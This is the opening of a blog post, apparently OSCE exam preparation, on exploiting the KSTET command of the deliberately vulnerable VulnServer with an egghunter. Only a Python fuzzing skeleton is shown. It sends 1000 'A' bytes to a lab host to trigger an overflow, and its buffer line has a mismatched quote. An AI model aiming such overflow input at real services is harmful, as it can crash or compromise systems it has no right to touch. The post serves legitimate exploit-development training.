---
layout: post
title:  "[VulnServer] Exploiting KSTET Command with Minimal Buffer Space Using Egghunter"
date:   2018-06-28
categories: [exploitdev, osceprep]
---

I used the following skeleton for the exploitation of the `KSTET` command. Instead of sending 5000 bytes of buffer to fuzz the command, I only used 1000 bytes this time.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A”*1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
```


![GTER Spike](/static/img/03/01.png)
